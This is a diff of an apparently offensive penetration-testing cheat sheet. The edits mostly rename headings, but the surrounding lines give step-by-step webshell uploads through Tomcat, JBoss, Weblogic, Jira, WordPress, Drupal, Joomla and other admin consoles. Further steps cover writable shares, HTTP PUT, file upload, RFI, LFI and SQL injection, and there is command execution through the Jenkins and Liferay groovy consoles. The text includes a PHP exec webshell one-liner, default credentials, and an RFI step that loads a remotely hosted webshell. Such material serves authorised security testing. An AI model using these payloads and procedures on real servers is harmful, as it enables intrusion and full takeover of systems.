@@ -15,7 +15,7 @@
 - [Technique 10 - Webshell upload using a DNN (DotNetNuke) CMS Website admin console](#Technique-10-Webshell-upload-using-a-DNN-(DotNetNuke)-CMS-Website-admin-console)
 - [Technique 11 - Webshell upload using a JOOMLA CMS Website admin console](#Technique-11-Webshell-upload-using-a-JOOMLA-CMS-Website-admin-console)
 - [Technique 12 - Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server root directory](#Technique-12-Webshell-upload-by-exploiting-an-insecure-writable-file-share-of-a-Web-server)
-- [Technique 13 - Webshell upload by abusing the insecure HTTP PUT method](#Technique-13-Webshell-upload-by-abusing-the-insecure-HTTP-PUT-method)
+- [Technique 13 - Webshell upload by abusing the insecure HTTP PUT method (Webdav)](#Technique-13-Webshell-upload-by-abusing-the-insecure-HTTP-PUT-method)
 - [Technique 14 - Webshell upload by exploiting a vulnerable file upload function](#Technique-14-Webshell-upload-by-exploiting-a-vulnerable-file-upload-function)
 - [Technique 15 - Webshell upload by exploiting a remote file include (RFI) vulnerability](#Technique-15-Webshell-upload-by-exploiting-a-remote-file-include-(RFI)-vulnerability)
 - [Technique 16 - Webshell upload by exploiting a local file include (LFI) vulnerability](#Technique-16-Webshell-upload-by-exploiting-a-local-file-include-(LFI)-vulnerability)
@@ -70,7 +70,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands
            + exec() function: <?php echo exec($_POST['cmd']); ?>
 ```
 
-#### Technique 2 - Apache Tomcat Manager Web console
+#### Technique 2. Webshell upload using an APACHE TOMCAT manager Web console
 ```
 ➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
 	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
@@ -129,7 +129,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands
 ```
 
 
-#### Technique 3 - JBoss administration JMX console
+#### Technique 3. Webshell upload using a JBOSS administration JMX Web console
 ```
 Example 1
 ---------
@@ -190,7 +190,7 @@ Example 2
 Other manual Webshell upload technique: https://securitysynapse.blogspot.com/2013/08/manually-exploiting-jboss-jmx-console.html
 ```
 
-#### Technique 4 - Weblogic administration console
+#### Technique 4. Webshell upload using a WEBLOGIC administration console
 ```
 ➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
 	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
@@ -221,7 +221,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 ➤ Step 7. Execute OS commands using the Webshell 
            - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
 ```
-#### Technique 5 - Webshell upload using a Splunk administration console
+#### Technique 5. Webshell upload using a SPLUNK web administration console
 ```
 ➤ Step 1. Download a Webshell customized for Splunk
 	   - https://github.com/dionach/Splunk-Web-Shell
@@ -237,7 +237,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 	   - browse the new app (your Webshell)
 ```
 
-#### Technique 6 - Webshell upload using a Jira administration console
+#### Technique 6. Webshell upload using a JIRA Web administration console
 ```
 ➤ Step 1. Download a Webshell customized for Jira
 	   - https://github.com/dubfr33/atlassian-webshell-plugin
@@ -250,7 +250,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 	   - then upload the Webshell plugin "atlassian-webshell-plugin\atlplug.jar"
 	   - finally access the Webshell to execute system command "https://IP-or-Url/plugins/servlet/com.jsos.shell/ShellServlet"
 ```
-#### Technique 7 - Webshell upload by abusing a WORDPRESS CMS Website admin console
+#### Technique 7. Webshell upload using a WORDPRESS CMS Website admin console
 ##### <i>If you have admin privileges over a CMS such as WordPress, Kentico, DotNetNuke, Drupal, Joomla [...] then you can upload a webshell and execute OS commands.</i>
 ``` 
 ➤ Step 1. Enumerate WordPress users or Guess the Wordpress admin's login  
@@ -278,7 +278,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 	                 > Https://website/wordpress-blog/wp-content/uploads/webshell.php?cmd=whoami
 ```
 
-#### Technique 8 - Webshell upload by abusing a DRUPAL CMS Website admin console 
+#### Technique 8. Webshell upload using a DRUPAL CMS Website admin console
 ``` 
 ➤ Step 1. Log into the Drupal CMS website as admin (to have the privilege to install new modules)
 ➤ Step 2. Click on the "Extend" tab and go to install new theme page (e.g. http://www.example.com/admin/modules/install)
@@ -289,7 +289,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 ➤ Step 7. Now visit the module page and execute OS commands via your webshell (e.g. http://www.example.com/modules/[module name]/webshell.php?cmd=whoami)
 ```
 
-#### Technique 9 - Webshell upload by abusing a KENTICO CMS Website admin console 
+#### Technique 9. Webshell upload using a KENTICO CMS Website admin console
 ``` 
 ➤ Step 1. Log into the Kentico admin console (e.g. http://mysite.com/admin)
 ➤ Step 2. Edit the list file extensions allowed to add '.asp' and '.aspx'
@@ -297,7 +297,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 ➤ Step 4. Now browse the webshell that you uploaded and execute OS commands
 ```
 
-#### Technique 10 - Webshell upload by abusing a DotNetNuke CMS (DNN) Website admin console 
+#### Technique 10. Webshell upload using a DNN (DotNetNuke) CMS Website admin consol
 ``` 
 ➤ Step 1. Log into the DotNetNuke CMS website as administrator
 ➤ Step 2. Go to "In Settings -> Security -> More -> More Security Settings" and add new allowed file extensions under "Allowable File Extensions"
@@ -305,7 +305,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 ➤ Step 3. Then go to "/admin/file-management" and upload an asp webshell (e.g. webshell.asp).
 ➤ Step 4. Finally, browse the page "/Portals/0/webshell.asp" to access your webshell and execute OS commands.
 ``` 
-#### Technique 11 - Webshell upload by abusing a JOOMLA CMS CMS Website admin console 
+#### Technique 11. Webshell upload using a JOOMLA CMS Website admin console
 ``` 
 ➤ Step 1. Log into the JOOMLA CMS website as administrator
           URL examples:
@@ -326,7 +326,8 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 
 ``` 
 
-#### Technique 12 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
+#### Technique 12. Webshell upload by exploiting an insecure writable file share of a Web server root directory
+| Common Web server root directory = C:\inetpub\wwwroot\ or /var/www/ or ...
 ```
 Example
 ➤ Step 1. Identify a file share of a Web server that is insecurely granting read & write permissions to all "Domain Users" over the folder 'C:\inetpub\wwwroot\'
@@ -339,7 +340,8 @@ Example
            - "http://x.x.x.x/application-name/Webshell.aspx" 
 ```
 
-#### Technique 13 - Webshell upload by abusing the insecure HTTP PUT method (WebDAV)
+#### Technique 13. Webshell upload by abusing the insecure HTTP PUT method
+| The HTTP PUT method is also known as one of Webdav methods
 ```
 ➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
 	   - Examples with CURL
@@ -426,7 +428,7 @@ Example
              <SNIP>
 ```
 
-#### Technique 14 - Webshell upload by exploiting a vulnerable file upload function
+#### Technique 14. Webshell upload by exploiting a vulnerable file upload function
 ```
 Example with a vulnerable PHP website
 
@@ -498,7 +500,7 @@ Example with a vulnerable PHP website
              uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-#### Technique 15 - Webshell upload by exploiting a RFI vulnerability
+#### Technique 15. Webshell upload by exploiting a remote file include (RFI) vulnerability
 ```
 Example
 ➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
@@ -517,7 +519,7 @@ Example
 	   - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
 ```
 
-#### Technique 16 - Webshell upload by exploiting a LFI vulnerability
+#### Technique 16. Webshell upload by exploiting a local file include (LFI) vulnerability
 ```
 Example
 ➤ Step 1. You find a website during an internal penetration test that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail' thanks to the LFI flaw.
@@ -558,7 +560,7 @@ Example
 	       <SNIP>
 ```
 
-#### Technique 17 -  Webshell upload by exploiting a SQL injection (SQLi) vulnerability
+#### Technique 17. Webshell upload by exploiting a SQL injection (SQLi) vulnerability
 
 ```
 Example
@@ -590,7 +592,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 -----------------
 
 ### II. Classic Web RCE techniques
-#### Technique 1 - RCE using an IBM Domino Web administration console
+#### Technique 1. RCE using an IBM Domino Web administration console
 ```
 ➤ Step 1. Log into the IBM Domino Web Administrator console and browse the Web Administrator database named "webadmin.nsf"
 	   - https://target-IP-or-Url/webadmin.nsf
@@ -599,12 +601,12 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 ➤ Step 4. Enter the OS command with any arguments directly in the "Domino Command" box and then click "Send"
 ```
 
-#### Technique 2 - RCE using a Jenkins web-based groovy script console
+#### Technique 2. RCE using a Jenkins web-based groovy script console
 ```
 ➤ Step 1. Log into a Jenkins Web console with admin privileges (e.g. admin access is uncredentialed or whith default admin credentials 'admin:password' have not been changed)
 
 ➤ Step 2. Browse the Jenkins web-based groovy script console that allows to execute OS commands on the underlying Windows server.
-	   - https://target-IP-or-Url/jenkins/script
+	   - https://target-IP-or-Url-of-Jenkins-Website/script
 
 ➤ Step 3. Execute OS command using the groovy script console in jenkins
            Basic examples:
@@ -612,7 +614,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 	   - print "ls /".execute().text					//for a Linux server
 ```
 
-#### Technique 3 - RCE using a Liferay CMS web-based groovy script console
+#### Technique 3. RCE using a Liferay CMS web-based groovy script console
 ```
 ➤ Step 1. Log into a Liferay CMS Web portal with admin privileges (e.g. default admin credentials 'test@liferay.com:test')
 
